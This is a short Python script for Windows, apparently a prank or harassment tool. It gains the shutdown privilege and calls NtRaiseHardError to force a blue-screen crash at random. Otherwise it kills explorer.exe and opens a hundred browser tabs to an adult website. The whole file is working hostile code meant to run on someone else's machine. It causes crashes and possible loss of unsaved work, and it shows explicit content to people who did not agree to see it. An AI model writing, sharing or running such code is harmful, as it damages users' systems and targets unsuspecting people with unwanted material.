import random
import sys
import os
import webbrowser
import time

# imports for bsod
from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref

# bsod script
def bsod():
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint())
    )

def main(): # main script
    run = random.randint(1,10) # 10% chance of just blue screening lmfao
    if run == 1:
        bsod()
    else:
        try:
            os.system("taskkill /f /im explorer.exe")
        except Exception as e: # I have no clue what exception it would call here if it gets blocked, so im just putting a general exception.
            print(f"Failed to kill explorer, exception: {e}")

        for _ in range(100): # spam opening website
            webbrowser.open_new_tab("https://e621.net/")
            time.sleep(0.05)

def startup(): # rolling 1 in 4 chance to run the main script
    run = random.randint(1,4)

    if run == 1:
        main()
    else:
        sys.exit()

startup()
